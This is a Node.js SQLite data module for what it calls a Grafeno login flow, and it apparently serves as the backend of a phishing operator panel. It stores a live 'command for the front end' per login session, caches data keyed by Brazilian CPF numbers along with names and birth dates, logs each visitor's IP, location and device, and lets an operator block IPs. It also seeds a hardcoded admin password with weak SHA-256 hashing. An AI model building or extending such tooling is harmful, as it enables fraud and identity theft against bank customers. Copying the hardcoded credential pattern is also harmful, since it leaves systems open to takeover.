/**
 * Módulo de banco de dados SQLite para o fluxo de login Grafeno.
 * Persiste sessões (comando atual) e cache de dados por CPF.
 */

const path = require('path');
const fs = require('fs');

let db = null;
let dbFailed = false; // evita tentar de novo e repetir log
const DB_DIR = path.join(__dirname, '..', 'data');
const DB_PATH = path.join(DB_DIR, 'grafeno.db');

function getDb() {
  if (db) return db;
  if (dbFailed) return null;
  try {
    const Database = require('better-sqlite3');
    if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });
    db = new Database(DB_PATH);
    initTables(db);
    return db;
  } catch (e) {
    dbFailed = true;
    console.warn('Grafeno: banco SQLite indisponível (', e.message, '). Usando memória.');
    return null;
  }
}

const crypto = require('crypto');
const ADMIN_SALT = 'grafeno-admin-v1';

function hashPassword(password) {
  return crypto.createHash('sha256').update(ADMIN_SALT + (password || '')).digest('hex');
}

function initTables(database) {
  database.exec(`
    CREATE TABLE IF NOT EXISTS sessoes (
      login TEXT PRIMARY KEY,
      comando TEXT NOT NULL DEFAULT '',
      detalhes TEXT NOT NULL DEFAULT '{}',
      last_update INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS user_cache (
      login TEXT PRIMARY KEY,
      data_json TEXT NOT NULL DEFAULT '{}',
      last_update INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS admins (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      login TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      created_at INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS acessos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT NOT NULL DEFAULT '',
      hash TEXT NOT NULL DEFAULT '',
      data INTEGER NOT NULL DEFAULT 0,
      pais TEXT NOT NULL DEFAULT '',
      estado TEXT NOT NULL DEFAULT '',
      cidade TEXT NOT NULL DEFAULT '',
      user_agent TEXT NOT NULL DEFAULT '',
      device TEXT NOT NULL DEFAULT '',
      blocked INTEGER NOT NULL DEFAULT 0,
      login TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS dados_cpf (
      cpf TEXT PRIMARY KEY,
      nome TEXT NOT NULL DEFAULT '',
      data_nascimento TEXT NOT NULL DEFAULT '',
      updated_at INTEGER NOT NULL DEFAULT 0
    );
    CREATE INDEX IF NOT EXISTS idx_sessoes_last_update ON sessoes(last_update);
    CREATE INDEX IF NOT EXISTS idx_user_cache_last_update ON user_cache(last_update);
    CREATE INDEX IF NOT EXISTS idx_acessos_data ON acessos(data);
  `);
  try {
    const cols = database.prepare('PRAGMA table_info(acessos)').all();
    if (!cols.some(c => c.name === 'login')) {
      database.exec('ALTER TABLE acessos ADD COLUMN login TEXT NOT NULL DEFAULT \'\'');
    }
  } catch (_) {}
  seedDefaultAdmin(database);
}

function seedDefaultAdmin(database) {
  if (!database) return;
  const existing = database.prepare('SELECT 1 FROM admins WHERE login = ?').get('admin');
  if (existing) return;
  const hash = hashPassword('hell777');
  database.prepare('INSERT INTO admins (login, password_hash, created_at) VALUES (?, ?, ?)').run('admin', hash, Date.now());
}

// --- Sessões (comando atual para o front) ---

function getSession(login) {
  const database = getDb();
  if (!database) return null;
  const row = database.prepare('SELECT comando, detalhes, last_update FROM sessoes WHERE login = ?').get(login);
  if (!row) return null;
  let detalhes = {};
  try {
    detalhes = JSON.parse(row.detalhes || '{}');
  } catch (_) {}
  return {
    comando: row.comando || '',
    detalhes,
    lastUpdate: row.last_update
  };
}

function setSession(login, comando, detalhes) {
  const database = getDb();
  if (!database) return;
  const detalhesStr = typeof detalhes === 'string' ? detalhes : JSON.stringify(detalhes || {});
  database.prepare(
    'INSERT INTO sessoes (login, comando, detalhes, last_update) VALUES (?, ?, ?, ?) ON CONFLICT(login) DO UPDATE SET comando = ?, detalhes = ?, last_update = ?'
  ).run(login, comando, detalhesStr, Date.now(), comando, detalhesStr, Date.now());
}

function updateSessionLastUpdate(login) {
  const database = getDb();
  if (!database) return;
  database.prepare('UPDATE sessoes SET last_update = ? WHERE login = ?').run(Date.now(), login);
}

function listSessions(maxIdleMs = 30 * 60 * 1000) {
  const database = getDb();
  if (!database) return [];
  const cutoff = Date.now() - maxIdleMs;
  const rows = database.prepare('SELECT login, comando, detalhes, last_update FROM sessoes WHERE last_update > ? ORDER BY last_update DESC').all(cutoff);
  return rows.map(row => {
    let detalhes = {};
    try {
      detalhes = JSON.parse(row.detalhes || '{}');
    } catch (_) {}
    return {
      login: row.login,
      comando: row.comando || '',
      detalhes,
      lastUpdate: row.last_update
    };
  });
}

// --- User cache (dados por CPF para o painel) ---

function getUserData(cpf) {
  const database = getDb();
  if (!database) return null;
  const row = database.prepare('SELECT data_json FROM user_cache WHERE login = ?').get(cpf);
  if (!row) return null;
  try {
    return JSON.parse(row.data_json || '{}');
  } catch (_) {
    return null;
  }
}

function setUserData(cpf, userData) {
  const database = getDb();
  if (!database) return;
  const dataStr = JSON.stringify(userData || {});
  database.prepare(
    'INSERT INTO user_cache (login, data_json, last_update) VALUES (?, ?, ?) ON CONFLICT(login) DO UPDATE SET data_json = ?, last_update = ?'
  ).run(cpf, dataStr, Date.now(), dataStr, Date.now());
}

function deleteOldCache(maxAgeMs = 30 * 60 * 1000) {
  const database = getDb();
  if (!database) return;
  const cutoff = Date.now() - maxAgeMs;
  database.prepare('DELETE FROM user_cache WHERE last_update < ?').run(cutoff);
  database.prepare('DELETE FROM sessoes WHERE last_update < ?').run(cutoff);
}

function deleteSession(login) {
  const database = getDb();
  if (!database) return;
  database.prepare('DELETE FROM sessoes WHERE login = ?').run(login);
}

function deleteUserData(login) {
  const database = getDb();
  if (!database) return;
  database.prepare('DELETE FROM user_cache WHERE login = ?').run(login);
}

function deleteAllSessions() {
  const database = getDb();
  if (!database) return;
  database.prepare('DELETE FROM sessoes').run();
}

function deleteAllUserCache() {
  const database = getDb();
  if (!database) return;
  database.prepare('DELETE FROM user_cache').run();
}

// --- Admins (login painel operador) ---

function getAdminByLogin(login) {
  const database = getDb();
  if (!database) return null;
  return database.prepare('SELECT id, login, password_hash FROM admins WHERE login = ?').get((login || '').toString().trim());
}

function verifyAdmin(login, password) {
  const admin = getAdminByLogin(login);
  if (!admin) return null;
  const hash = hashPassword(password);
  if (hash !== admin.password_hash) return null;
  return { id: admin.id, login: admin.login };
}

// --- Acessos (visitas à página - contagem ao cair na página) ---

function insertAcesso(ip, hash, pais, estado, cidade, userAgent, device) {
  const database = getDb();
  if (!database) return null;
  const id = database.prepare(
    'INSERT INTO acessos (ip, hash, data, pais, estado, cidade, user_agent, device, blocked) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0)'
  ).run(ip || '', hash || '', Date.now(), pais || '', estado || '', cidade || '', userAgent || '', device || '');
  return id.lastInsertRowid;
}

function listAcessos(limit = 500) {
  const database = getDb();
  if (!database) return [];
  const rows = database.prepare(
    'SELECT id, ip, hash, data, pais, estado, cidade, user_agent, device, blocked, login FROM acessos ORDER BY data DESC LIMIT ?'
  ).all(limit);
  return rows.map(r => ({
    id: r.id,
    ip: r.ip || '',
    hash: r.hash || '',
    data: r.data,
    pais: r.pais || '',
    estado: r.estado || '',
    cidade: r.cidade || '',
    user_agent: r.user_agent || '',
    device: r.device || '',
    blocked: !!r.blocked,
    login: (r.login || '').toString().trim()
  }));
}

function vincularAcessoPorIp(ip, login) {
  const database = getDb();
  if (!database || !ip || !login) return false;
  const cpf = (login || '').replace(/\D/g, '');
  if (cpf.length !== 11) return false;
  let row = database.prepare('SELECT id FROM acessos WHERE ip = ? AND (login IS NULL OR login = \'\') ORDER BY data DESC LIMIT 1').get(ip);
  if (!row) row = database.prepare('SELECT id FROM acessos WHERE ip = ? ORDER BY data DESC LIMIT 1').get(ip);
  if (!row) return false;
  const r = database.prepare('UPDATE acessos SET login = ? WHERE id = ?').run(cpf, row.id);
  return r.changes > 0;
}

function getAcessoByLogin(login) {
  const database = getDb();
  if (!database || !login) return null;
  const cpf = (login || '').replace(/\D/g, '');
  if (cpf.length !== 11) return null;
  const r = database.prepare('SELECT ip FROM acessos WHERE login = ? ORDER BY data DESC LIMIT 1').get(cpf);
  return r ? { ip: r.ip || '' } : null;
}

/** Se o login ainda não tiver acesso vinculado, cria um acesso com o IP informado e vincula. Assim dá para bloquear. */
function ensureAcessoForLogin(ip, login) {
  const database = getDb();
  if (!database || !ip || !login) return false;
  const cpf = (login || '').replace(/\D/g, '');
  if (cpf.length !== 11) return false;
  if (getAcessoByLogin(login)) return true; // já tem acesso vinculado
  insertAcesso(ip, '', '', '', '', '', '');
  return vincularAcessoPorIp(ip, login);
}

function deleteAcesso(id) {
  const database = getDb();
  if (!database) return false;
  const r = database.prepare('DELETE FROM acessos WHERE id = ?').run(id);
  return r.changes > 0;
}

function blockAcesso(id) {
  const database = getDb();
  if (!database) return false;
  const r = database.prepare('UPDATE acessos SET blocked = 1 WHERE id = ?').run(id);
  return r.changes > 0;
}

function isIpBlocked(ip) {
  const database = getDb();
  if (!database) return false;
  const r = database.prepare('SELECT 1 FROM acessos WHERE ip = ? AND blocked = 1 LIMIT 1').get(ip || '');
  return !!r;
}

function deleteAllAcessos() {
  const database = getDb();
  if (!database) return false;
  database.prepare('DELETE FROM acessos').run();
  return true;
}

// --- dados_cpf (nome, data_nascimento por CPF para o painel) ---

function getDadosCpf(cpf) {
  const database = getDb();
  if (!database || !cpf) return null;
  const c = (cpf || '').replace(/\D/g, '');
  if (c.length !== 11) return null;
  const row = database.prepare('SELECT nome, data_nascimento FROM dados_cpf WHERE cpf = ?').get(c);
  return row ? { nome: row.nome || '', dataNascimento: row.data_nascimento || '' } : null;
}

function setDadosCpf(cpf, nome, dataNascimento) {
  const database = getDb();
  if (!database || !cpf) return;
  const c = (cpf || '').replace(/\D/g, '');
  if (c.length !== 11) return;
  database.prepare(
    'INSERT INTO dados_cpf (cpf, nome, data_nascimento, updated_at) VALUES (?, ?, ?, ?) ON CONFLICT(cpf) DO UPDATE SET nome = ?, data_nascimento = ?, updated_at = ?'
  ).run(c, nome || '', dataNascimento || '', Date.now(), nome || '', dataNascimento || '', Date.now());
}

module.exports = {
  hashPassword,
  getAdminByLogin,
  verifyAdmin,
  getDb,
  getSession,
  setSession,
  updateSessionLastUpdate,
  listSessions,
  getUserData,
  setUserData,
  deleteOldCache,
  deleteSession,
  deleteUserData,
  deleteAllSessions,
  deleteAllUserCache,
  insertAcesso,
  listAcessos,
  deleteAcesso,
  blockAcesso,
  isIpBlocked,
  vincularAcessoPorIp,
  getAcessoByLogin,
  ensureAcessoForLogin,
  deleteAllAcessos,
  getDadosCpf,
  setDadosCpf,
  DB_PATH
};
